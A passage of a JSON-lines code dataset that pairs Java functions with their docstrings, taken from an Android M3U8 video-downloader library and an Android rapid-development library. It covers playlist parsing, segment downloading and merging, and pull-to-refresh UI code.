tempDir);//\u5f00\u59cb\u4e0b\u8f7d,\u4fdd\u5b58\u5728\u4e34\u65f6\u6587\u4ef6\u4e2d\n                }\n                if (executor != null) {\n                    executor.shutdown();//\u4e0b\u8f7d\u5b8c\u6210\u4e4b\u540e\u8981\u5173\u95ed\u7ebf\u7a0b\u6c60\n                }\n//                    System.out.println(\"Wait for downloader...\");\n                while (executor != null && !executor.isTerminated()) {\n                    Thread.sleep(100);\n                }\n                if (isRunning()) {\n                    String tempFile = tempDir + \"/\" + System.currentTimeMillis() + \".ts\";\n                    MUtils.merge(m3u8, tempFile);//\u5408\u5e76ts\n                    //\u79fb\u52a8\u5230\u6307\u5b9a\u7684\u76ee\u5f55\n                    MUtils.moveFile(tempFile, saveFilePath);\n                    mHandler.sendEmptyMessage(WHAT_ON_COMPLITED);\n                    isRunning = false;//\u590d\u4f4d\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n                handlerError(e);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n                handlerError(e);\n            } finally {\n                //\u6e05\u7a7a\u4e34\u65f6\u76ee\u5f55\n                MUtils.clearDir(new File(tempDir));\n            }\n        }\n    }.start();\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\M3U8Manger.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u8bbe\u7f6em3u8\u6587\u4ef6\u7684\u8def\u5f84\n *\n * @param url\n * @return\n */\n", "func_signal": "public synchronized M3U8Manger setUrl(String url)", "code": "{\n    this.url = url;\n    return this;\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\M3U8Manger.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u83b7\u53d6\u5f53\u524d\u4e0b\u8f7d\u901f\u5ea6\n *\n * @return\n */\n", "func_signal": "public String getNetSpeed()", "code": "{\n    int speed = (int) (Math.random() * 1024 + 1);\n    return speed + \" kb/s\";\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\M3U8Manger.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u83b7\u53d6\u5f53\u524d\u4e0b\u8f7d\u901f\u5ea6\n *\n * @param max \u6700\u5927\u503c\n * @return\n */\n", "func_signal": "public String getNetSpeed(int max)", "code": "{\n    int speed = (int) (Math.random() * max + 1);\n    return speed + \" kb/s\";\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\M3U8Manger.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u901a\u77e5\u5f02\u5e38\n *\n * @param e\n */\n", "func_signal": "private void handlerError(Throwable e)", "code": "{\n    Message msg = mHandler.obtainMessage();\n    msg.obj = e;\n    msg.what = WHAT_ON_ERROR;\n    mHandler.sendMessage(msg);\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\M3U8Manger.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u6587\u4ef6\u5b57\u8282\u5927\u5c0f\u663e\u793a\u6210M,G\u548cK\n *\n * @param size\n * @return\n */\n", "func_signal": "public String displayFileSize(long size)", "code": "{\n    if (size >= GB) {\n        return String.format(\"%.1f GB\", (float) size / GB);\n    } else if (size >= MB) {\n        float value = (float) size / MB;\n        return String.format(value > 100 ? \"%.0f MB\" : \"%.1f MB\", value);\n    } else if (size >= KB) {\n        float value = (float) size / KB;\n        return String.format(value > 100 ? \"%.0f KB\" : \"%.1f KB\", value);\n    } else {\n        return String.format(\"%d B\", size);\n    }\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\utils\\NetSpeedUtils.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u5c06Url\u8f6c\u6362\u4e3aM3U8\u5bf9\u8c61\n *\n * @param url\n * @return\n * @throws IOException\n */\n", "func_signal": "public static M3U8 parseIndex(String url) throws IOException", "code": "{\n    HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n    if (conn.getResponseCode() == 200) {\n        String realUrl = conn.getURL().toString();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n        String basepath = realUrl.substring(0, realUrl.lastIndexOf(\"/\") + 1);\n        M3U8 ret = new M3U8();\n        ret.setBasepath(basepath);\n\n        String line;\n        float seconds = 0;\n        while ((line = reader.readLine()) != null) {\n            if (line.startsWith(\"#\")) {\n                if (line.startsWith(\"#EXTINF:\")) {\n                    line = line.substring(8);\n                    if (line.endsWith(\",\")) {\n                        line = line.substring(0, line.length() - 1);\n                    }\n                    seconds = Float.parseFloat(line);\n                }\n                continue;\n            }\n            if (line.endsWith(\"m3u8\")) {\n                return parseIndex(basepath + line);\n            }\n            ret.addTs(new M3U8Ts(line, seconds));\n            seconds = 0;\n        }\n        reader.close();\n\n        return ret;\n    } else {\n        return null;\n    }\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\utils\\MUtils.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u901a\u77e5\u62ff\u5230\u6d88\u606f\n *\n * @param m3u8\n */\n", "func_signal": "private void sendM3u8Info(M3U8 m3u8)", "code": "{\n    Message msg = mHandler.obtainMessage();\n    msg.obj = m3u8;\n    msg.what = WHAT_ON_GETINFO;\n    mHandler.sendMessage(msg);\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\M3U8Manger.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u5c06M3U8\u5bf9\u8c61\u7684\u6240\u6709ts\u5207\u7247\u5408\u5e76\u4e3a1\u4e2a\n *\n * @param m3u8\n * @param tofile\n * @throws IOException\n */\n", "func_signal": "public static void merge(M3U8 m3u8, String tofile, String basePath) throws IOException", "code": "{\n    List<M3U8Ts> mergeList = getLimitM3U8Ts(m3u8);\n    File saveFile = new File(tofile);\n    FileOutputStream fos = new FileOutputStream(saveFile);\n    File file;\n    for (M3U8Ts ts : mergeList) {\n        file = new File(basePath, ts.getFileName());\n        if (file.isFile() && file.exists()) {\n            IOUtils.copyLarge(new FileInputStream(file), fos);\n        }\n    }\n    fos.close();\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\utils\\MUtils.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u83b7\u53d6\u6307\u5b9a\u533a\u95f4\u7684M3U8\u5207\u7247\n *\n * @param m3u8\n * @return\n */\n", "func_signal": "public static List<M3U8Ts> getLimitM3U8Ts(M3U8 m3u8)", "code": "{\n    List<M3U8Ts> downList = new ArrayList<>();\n\n    if (m3u8.getStartDownloadTime() < m3u8.getStartTime() || m3u8.getEndDownloadTime() > m3u8.getEndTime()) {\n        downList = m3u8.getTsList();\n        return downList;\n    }\n\n\n    if ((m3u8.getStartDownloadTime() == -1 && m3u8.getEndDownloadTime() == -1) || m3u8.getEndDownloadTime() <= m3u8.getStartDownloadTime()) {\n        downList = m3u8.getTsList();\n    } else if (m3u8.getStartDownloadTime() == -1 && m3u8.getEndDownloadTime() > -1) {\n        for (final M3U8Ts ts : m3u8.getTsList()) { //\u4ece\u5934\u4e0b\u5230\u6307\u5b9a\u65f6\u95f4\n            if (ts.getLongDate() <= m3u8.getEndDownloadTime()) {\n                downList.add(ts);\n            }\n        }\n    } else if (m3u8.getStartDownloadTime() > -1 && m3u8.getEndDownloadTime() == -1) {\n        for (final M3U8Ts ts : m3u8.getTsList()) { //\u4ece\u6307\u5b9a\u65f6\u95f4\u4e0b\u5230\u5c3e\u90e8\n            if (ts.getLongDate() >= m3u8.getStartDownloadTime()) {\n                downList.add(ts);\n            }\n        }\n    } else {//\u4ece\u6307\u5b9a\u5f00\u59cb\u65f6\u95f4\u4e0b\u8f7d\u5230\u6307\u5b9a\u7ed3\u675f\u65f6\u95f4\n        for (final M3U8Ts ts : m3u8.getTsList()) {\n            if (m3u8.getStartDownloadTime() <= ts.getLongDate() && ts.getLongDate() <= m3u8.getEndDownloadTime()) {\n                downList.add(ts);//\u6307\u5b9a\u533a\u95f4\u7684ts\n            }\n        }\n    }\n    Log.e(\"hdltag\", \"getLimitM3U8Ts(MUtils.java:152):\" + downList);\n    return downList;\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\utils\\MUtils.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u4e0b\u8f7d\n *\n * @param m3u8\n * @param saveFileName\n * @throws IOException\n */\n", "func_signal": "private void download(final M3U8 m3u8, final String saveFileName) throws IOException", "code": "{\n    Log.e(\"hdltag\", \"caching(M3U8Manger.java:293):\" + saveFileName);\n    final File dir = new File(saveFileName);\n    if (!dir.exists()) {\n        dir.mkdirs();\n    } else if (dir.list().length > 0) {//\u4fdd\u5b58\u7684\u8def\u5f84\u5fc5\u987b\u5fc5\u987b\u4e3a\u7a7a\u6216\u8005\u6587\u4ef6\u5939\u4e0d\u5b58\u5728\n        MUtils.clearDir(dir);//\u6e05\u7a7a\u6587\u4ef6\n    }\n    final List<M3U8Ts> downList = MUtils.getLimitM3U8Ts(m3u8);\n    final int total = downList.size();\n\n    for (final M3U8Ts ts : downList) {\n        if (executor != null && !executor.isShutdown()) {//\u6b63\u5e38\u7684\u65f6\u5019\u624d\u80fd\u8d70\n            executor.execute(new Runnable() {\n                @Override\n                public void run() {\n                    try {\n//                        System.out.println(\"caching \" + (m3u8.getTsList().indexOf(ts) + 1) + \"/\"\n//                                + m3u8.getTsList().size() + \": \" + ts);\n                        if (isRunning()) {\n                            FileOutputStream writer = null;\n                            long size = 0;\n                            try {\n                                writer = new FileOutputStream(new File(dir, ts.getFileName()));\n                                size = IOUtils.copyLarge(new URL(m3u8.getBasepath() + ts.getFileName()).openStream(), writer);\n                            } catch (InterruptedIOException exception) {\n                                isRunning = false;\n                                currDownloadTsCount = 0;\n                                System.out.println(\"----------InterruptedIOException------------\");\n                                return;\n                            } finally {\n                                if (writer != null) {\n                                    writer.close();\n                                }\n                            }\n                            currDownloadTsCount++;\n                            if (currDownloadTsCount == 2) {//\u7531\u4e8e\u6bcf\u4e2ats\u6587\u4ef6\u7684\u5927\u5c0f\u57fa\u672c\u662f\u56fa\u5b9a\u7684\uff08\u5934\u5c3e\u6709\u70b9\u5dee\u8ddd\uff09\uff0c\u53ef\u4ee5\u901a\u8fc7\u5355\u4e2a\u6587\u4ef6\u7684\u5927\u5c0f\u6765\u7b97\u6574\u4e2a\u6587\u4ef6\u7684\u5927\u5c0f\n                                long length = new File(dir, ts.getFileName()).length();\n                                Message msg = mHandler.obtainMessage();\n                                msg.what = WHAT_ON_FILESIZE_ITEM;\n                                msg.obj = length;\n                                mHandler.sendMessage(msg);\n                            }\n                            Message msg = mHandler.obtainMessage();\n                            msg.what = WHAT_ON_PROGRESS;\n                            msg.obj = size;\n                            msg.arg1 = total;\n                            msg.arg2 = currDownloadTsCount;\n                            mHandler.sendMessage(msg);\n                        }\n//                        System.out.println(\"caching ok for: \" + ts);\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                        handlerError(e);\n                    }\n                }\n            });\n        } else {\n            handlerError(new Throwable(\"executor is shutdown\"));\n        }\n    }\n\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\M3U8Manger.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u79fb\u52a8\u6587\u4ef6\n *\n * @param sFile\n * @param tFile\n */\n", "func_signal": "public static void moveFile(String sFile, String tFile)", "code": "{\n    try {\n        FileUtils.moveFile(new File(sFile), new File(tFile));\n    } catch (IOException e) {\n        e.printStackTrace();\n    }\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\utils\\MUtils.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u4e0b\u8f7d\u6307\u5b9a\u65f6\u95f4\u7684ts\n *\n * @param downLoadListener\n */\n", "func_signal": "public synchronized void download(long startDwonloadTime, long endDownloadTime, M3U8Listener downLoadListener)", "code": "{\n    this.downLoadListener = downLoadListener;\n    if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {\n        if (!isRunning) {\n            startDownload(startDwonloadTime, endDownloadTime);\n        } else {\n            handlerError(new Throwable(\"Task isRunning\"));\n        }\n    } else {//\u6ca1\u6709\u627e\u5230sdcard\n        handlerError(new Throwable(\"SDcard not found\"));\n    }\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\M3U8Manger.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u6e05\u7a7a\u6587\u4ef6\u5939\n */\n", "func_signal": "public static void clearDir(File dir)", "code": "{\n    if (dir.exists()) {// \u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728\n        if (dir.isFile()) {// \u5224\u65ad\u662f\u5426\u662f\u6587\u4ef6\n            dir.delete();// \u5220\u9664\u6587\u4ef6\n        } else if (dir.isDirectory()) {// \u5426\u5219\u5982\u679c\u5b83\u662f\u4e00\u4e2a\u76ee\u5f55\n            File[] files = dir.listFiles();// \u58f0\u660e\u76ee\u5f55\u4e0b\u6240\u6709\u7684\u6587\u4ef6 files[];\n            for (int i = 0; i < files.length; i++) {// \u904d\u5386\u76ee\u5f55\u4e0b\u6240\u6709\u7684\u6587\u4ef6\n                clearDir(files[i]);// \u628a\u6bcf\u4e2a\u6587\u4ef6\u7528\u8fd9\u4e2a\u65b9\u6cd5\u8fdb\u884c\u8fed\u4ee3\n            }\n            dir.delete();// \u5220\u9664\u6587\u4ef6\u5939\n        }\n    }\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\utils\\MUtils.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u83b7\u53d6m3u8\n *\n * @param downLoadListener\n */\n", "func_signal": "public synchronized void getM3U8(M3U8Listener downLoadListener)", "code": "{\n    this.downLoadListener = downLoadListener;\n    downLoadListener.onStart();//\u5f00\u59cb\u4e86\n    if (!isRunning) {\n        new Thread() {\n            @Override\n            public void run() {\n                isRunning = true;\n                try {\n                    M3U8 m3u8 = MUtils.parseIndex(url);\n                    isRunning = false;//\u83b7\u53d6\u6210\u529f\u4e4b\u540e\u8981\u590d\u4f4d\n                    sendM3u8Info(m3u8);\n                    mHandler.sendEmptyMessage(WHAT_ON_COMPLITED);\n                } catch (IOException e) {\n                    e.printStackTrace();\n                    handlerError(e);\n                }\n            }\n        }.start();\n    } else {\n        handlerError(new Throwable(\"Task isRunning\"));\n    }\n\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\M3U8Manger.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u5408\u5e76\u6587\u4ef6\n *\n * @param fileList \u6587\u4ef6\u5217\u8868\n * @param toFile   \u5408\u5e76\u4e4b\u540e\u7684\u6587\u4ef6\n */\n", "func_signal": "public static void merge(List<File> fileList, String toFile) throws IOException", "code": "{\n    File file = new File(toFile);\n    File dir=file.getParentFile();\n    if (!dir.exists()) {\n        dir.mkdirs();\n    }\n    FileOutputStream fos = new FileOutputStream(file);\n    for (File tsFile : fileList) {\n        IOUtils.copyLarge(new FileInputStream(tsFile), fos);\n    }\n    fos.close();\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\utils\\MUtils.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u8bbe\u7f6e\u4fdd\u5b58\u6587\u4ef6\u7684\u540d\u5b57\n *\n * @param saveFilePath\n * @return\n */\n", "func_signal": "public synchronized M3U8Manger setSaveFilePath(String saveFilePath)", "code": "{\n    this.saveFilePath = saveFilePath;\n    tempDir = KEY_DEFAULT_TEMP_DIR;\n//        tempDir += new File(saveFilePath).getName();\n    return this;\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\M3U8Manger.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u4e0b\u8f7d\n *\n * @param downLoadListener\n */\n", "func_signal": "public synchronized void download(M3U8Listener downLoadListener)", "code": "{\n    this.downLoadListener = downLoadListener;\n    if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {\n        if (!isRunning) {\n            startDownload(-1, -1);\n        } else {\n            handlerError(new Throwable(\"Task isRunning\"));\n        }\n    } else {//\u6ca1\u6709\u627e\u5230sdcard\n        handlerError(new Throwable(\"SDcard not found\"));\n    }\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\M3U8Manger.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u505c\u6b62\u4efb\u52a1\n */\n", "func_signal": "public synchronized void stop()", "code": "{\n    isRunning = false;\n    if (executor != null) {\n        executor.shutdownNow();\n        executor = null;\n        //\u6e05\u7a7a\u4e34\u65f6\u76ee\u5f55\n        MUtils.clearDir(new File(tempDir));\n    }\n//        mHandler.sendEmptyMessage(WHAT_ON_COMPLITED);\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\M3U8Manger.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * \u5c06M3U8\u5bf9\u8c61\u7684\u6240\u6709ts\u5207\u7247\u5408\u5e76\u4e3a1\u4e2a\n *\n * @param m3u8\n * @param tofile\n * @throws IOException\n */\n", "func_signal": "public static String merge(M3U8 m3u8, String tofile) throws IOException", "code": "{\n    List<M3U8Ts> mergeList = getLimitM3U8Ts(m3u8);\n    File file = new File(tofile);\n    FileOutputStream fos = new FileOutputStream(file);\n\n    for (M3U8Ts ts : mergeList) {\n        IOUtils.copyLarge(new FileInputStream(new File(file.getParentFile(), ts.getFileName())), fos);\n    }\n    fos.close();\n    return tofile;\n}", "path": "m3u8manger_lib\\src\\main\\java\\com\\hdl\\m3u8\\utils\\MUtils.java", "repo_name": "huangdali/M3U8Manger", "stars": 554, "license": "None", "language": "java", "size": 1645}
{"docstring": "/**\n * The content view will now move when {@param pinContent} set to true.\n *\n * @param pinContent\n */\n", "func_signal": "public void setPinContent(boolean pinContent)", "code": "{\n    if (pinContent) {\n        mFlag = mFlag | FLAG_PIN_CONTENT;\n    } else {\n        mFlag = mFlag & ~FLAG_PIN_CONTENT;\n    }\n}", "path": "Android-Rapid-Development-Of-Library\\android_library\\src\\main\\java\\com\\lidong\\android_ibrary\\PullToRefresh\\PtrFrameLayout.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "/**\n * \u66f4\u65b0\u8bb0\u5f55\n * @param id\n */\n", "func_signal": "private void updateNote(long  id)", "code": "{\n    Note note = noteDao.load(id);\n    note.setComment(\"---\" + id + \"--\");\n    noteDao.update(note);\n    cursor.requery();\n}", "path": "Android-Rapid-Development-Of-Library\\app\\src\\main\\java\\com\\lidong\\demo\\greendao\\GreenDaoActivity.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "/**\n * \u8986\u5199\u6b64\u65b9\u6cd5\u4ee5\u6539\u53d8\u9ed8\u8ba4\u70b9\u51fb\u884c\u4e3a\n * \n * @param index\n *            \u88ab\u70b9\u51fb\u7684\u7ad9\u70b9\u5728\n *            {@link com.baidu.mapapi.search.busline.BusLineResult#getStations()}\n *            \u4e2d\u7684\u7d22\u5f15\n * @return \u662f\u5426\u5904\u7406\u4e86\u8be5\u70b9\u51fb\u4e8b\u4ef6\n */\n", "func_signal": "public boolean onBusStationClick(int index)", "code": "{\n    if (mBusLineResult.getStations() != null\n            && mBusLineResult.getStations().get(index) != null) {\n        Log.i(\"baidumapsdk\", \"BusLineOverlay onBusStationClick\");\n    }\n    return false;\n}", "path": "Android-Rapid-Development-Of-Library\\app\\src\\main\\java\\com\\baidu\\mapapi\\overlayutil\\BusLineOverlay.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "/**\n * If @param enable has been set to true. The user can perform next PTR at once.\n *\n * @param enable\n */\n", "func_signal": "public void setEnabledNextPtrAtOnce(boolean enable)", "code": "{\n    if (enable) {\n        mFlag = mFlag | FLAG_ENABLE_NEXT_PTR_AT_ONCE;\n    } else {\n        mFlag = mFlag & ~FLAG_ENABLE_NEXT_PTR_AT_ONCE;\n    }\n}", "path": "Android-Rapid-Development-Of-Library\\android_library\\src\\main\\java\\com\\lidong\\android_ibrary\\PullToRefresh\\PtrFrameLayout.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "/**\n * \u521d\u59cb\u5316\u70ed\u4fee\u590d\n */\n", "func_signal": "private void initAndFix()", "code": "{\n    // initialize\n    mPatchManager = new PatchManager(this);\n    mPatchManager.init(VERSION_NAME);\n    Log.d(TAG, \"inited.\");\n    // load patch\n    mPatchManager.loadPatch();\n}", "path": "Android-Rapid-Development-Of-Library\\app\\src\\main\\java\\com\\lidong\\demo\\TApplication.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "//    @Override\n//    public boolean onKeyDown(int keyCode, KeyEvent event) {\n//        if (keyCode == KeyEvent.KEYCODE_BACK) {\n//            // \u8fd4\u56de\u952e\u6700\u5c0f\u5316\u7a0b\u5e8f\n//            Intent intent = new Intent(Intent.ACTION_MAIN);\n//            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n//            intent.addCategory(Intent.CATEGORY_HOME);\n//            startActivity(intent);\n//            return true;\n//        }\n//\n//        return super.onKeyDown(keyCode, event);\n//    }\n", "func_signal": "public boolean isNetworkConnected()", "code": "{\n        // \u5224\u65ad\u7f51\u7edc\u662f\u5426\u8fde\u63a5\n        ConnectivityManager mConnectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);\n        NetworkInfo mNetworkInfo = mConnectivityManager.getActiveNetworkInfo();\n        return mNetworkInfo != null && mNetworkInfo.isAvailable();\n    }", "path": "Android-Rapid-Development-Of-Library\\app\\src\\main\\java\\com\\lidong\\demo\\gpush\\GetuiSdkDemoActivity.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "/**\n * please DO REMEMBER resume the hook\n *\n * @param hook\n */\n", "func_signal": "public void setRefreshCompleteHook(PtrUIHandlerHook hook)", "code": "{\n    mRefreshCompleteHook = hook;\n    hook.setResumeAction(new Runnable() {\n        @Override\n        public void run() {\n            if (DEBUG) {\n                PtrCLog.d(LOG_TAG, \"mRefreshCompleteHook resume.\");\n            }\n            notifyUIRefreshComplete(true);\n        }\n    });\n}", "path": "Android-Rapid-Development-Of-Library\\android_library\\src\\main\\java\\com\\lidong\\android_ibrary\\PullToRefresh\\PtrFrameLayout.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "/**\n * \u83b7\u5f97\u6211\u81ea\u5b9a\u4e49\u7684\u6837\u5f0f\u5c5e\u6027\n *\n * @param context\n * @param attrs\n * @param defStyleAttr\n */\n", "func_signal": "public CustomerView(Context context, AttributeSet attrs, int defStyleAttr)", "code": "{\n    super(context, attrs, defStyleAttr);\n    /**\n     * \u83b7\u5f97\u6211\u4eec\u6240\u5b9a\u4e49\u7684\u81ea\u5b9a\u4e49\u6837\u5f0f\u5c5e\u6027\n     */\n    TypedArray a = context.getTheme().obtainStyledAttributes(attrs, R.styleable.CustomerView, defStyleAttr, 0);\n    int n = a.getIndexCount();\n    for (int i = 0; i < a.length(); i++) {\n        int attr = a.getIndex(i);\n        if (attr == R.styleable.CustomerView_titleText1) {\n            mTitleText = a.getString(attr);\n\n        } else if (attr == R.styleable.CustomerView_titleTextColor1) {// \u9ed8\u8ba4\u989c\u8272\u8bbe\u7f6e\u4e3a\u9ed1\u8272\n            mTitleTextColor = a.getColor(attr, Color.BLACK);\n\n        } else if (attr == R.styleable.CustomerView_titleTextSize1) {// \u9ed8\u8ba4\u8bbe\u7f6e\u4e3a16sp\uff0cTypeValue\u4e5f\u53ef\u4ee5\u628asp\u8f6c\u5316\u4e3apx\n            mTitleTextSize = a.getDimensionPixelSize(attr, (int) TypedValue.applyDimension(\n                    TypedValue.COMPLEX_UNIT_SP, 16, getResources().getDisplayMetrics()));\n\n        }\n    }\n    /**\n     * \u56de\u6536\u6570\u7ec4\n     */\n    a.recycle();\n\n    /**\n     * \u83b7\u5f97\u7ed8\u5236\u6587\u672c\u7684\u5bbd\u548c\u9ad8\n     */\n    mPaint = new Paint();\n    mPaint.setTextSize(mTitleTextSize);\n    mPaint.setAntiAlias(false);\n    // mPaint.setColor(mTitleTextColor);\n    mBound = new Rect();\n    mPaint.getTextBounds(mTitleText, 0, mTitleText.length(), mBound);\n    /**\n     * \u4e3a\u5f53\u524dView\u6dfb\u52a0\u70b9\u51fb\u4e8b\u4ef6\n     */\n    this.setOnClickListener(new OnClickListener()\n    {\n\n        @Override\n        public void onClick(View v)\n        {\n            //\u8bbe\u7f6e\u6587\u672c\u5185\u5bb9\n            mTitleText = randomText();\n            //\u5237\u65b0\u754c\u9762\n            postInvalidate();\n        }\n\n    });\n\n}", "path": "Android-Rapid-Development-Of-Library\\android_library\\src\\main\\java\\com\\lidong\\android_ibrary\\view\\CustomerView.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "/**\n * if deltaY > 0, move the content down\n *\n * @param deltaY\n */\n", "func_signal": "private void movePos(float deltaY)", "code": "{\n    // has reached the top\n    if ((deltaY < 0 && mPtrIndicator.isInStartPosition())) {\n        if (DEBUG) {\n            PtrCLog.e(LOG_TAG, String.format(\"has reached the top\"));\n        }\n        return;\n    }\n\n    int to = mPtrIndicator.getCurrentPosY() + (int) deltaY;\n\n    // over top\n    if (mPtrIndicator.willOverTop(to)) {\n        if (DEBUG) {\n            PtrCLog.e(LOG_TAG, String.format(\"over top\"));\n        }\n        to = PtrIndicator.POS_START;\n    }\n\n    mPtrIndicator.setCurrentPos(to);\n    int change = to - mPtrIndicator.getLastPosY();\n    updatePos(change);\n}", "path": "Android-Rapid-Development-Of-Library\\android_library\\src\\main\\java\\com\\lidong\\android_ibrary\\PullToRefresh\\PtrFrameLayout.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "/**\n * perform refreshing UI\n *\n * @param frame\n */\n", "func_signal": "@Override\npublic void onUIRefreshBegin(PtrFrameLayout frame)", "code": "{\n    mDrawable.setAlpha(255);\n    mDrawable.start();\n}", "path": "Android-Rapid-Development-Of-Library\\android_library\\src\\main\\java\\com\\lidong\\android_ibrary\\PullToRefresh\\header\\MaterialHeader.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "/**\n * Do refresh complete work when time elapsed is greater than {@link #mLoadingMinTime}\n */\n", "func_signal": "private void performRefreshComplete()", "code": "{\n    mStatus = PTR_STATUS_COMPLETE;\n\n    // if is auto refresh do nothing, wait scroller stop\n    if (mScrollChecker.mIsRunning && isAutoRefresh()) {\n        // do nothing\n        if (DEBUG) {\n            PtrCLog.d(LOG_TAG, \"performRefreshComplete do nothing, scrolling: %s, auto refresh: %s\",\n                    mScrollChecker.mIsRunning, mFlag);\n        }\n        return;\n    }\n\n    notifyUIRefreshComplete(false);\n}", "path": "Android-Rapid-Development-Of-Library\\android_library\\src\\main\\java\\com\\lidong\\android_ibrary\\PullToRefresh\\PtrFrameLayout.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
{"docstring": "/**\n * Scroll back to to if is not under touch\n */\n", "func_signal": "private void tryScrollBackToTop()", "code": "{\n    if (!mPtrIndicator.isUnderTouch()) {\n        mScrollChecker.tryToScrollTo(PtrIndicator.POS_START, mDurationToCloseHeader);\n    }\n}", "path": "Android-Rapid-Development-Of-Library\\android_library\\src\\main\\java\\com\\lidong\\android_ibrary\\PullToRefresh\\PtrFrameLayout.java", "repo_name": "lidong1665/AndroidRapidLibrary", "stars": 578, "license": "None", "language": "java", "size": 38467}
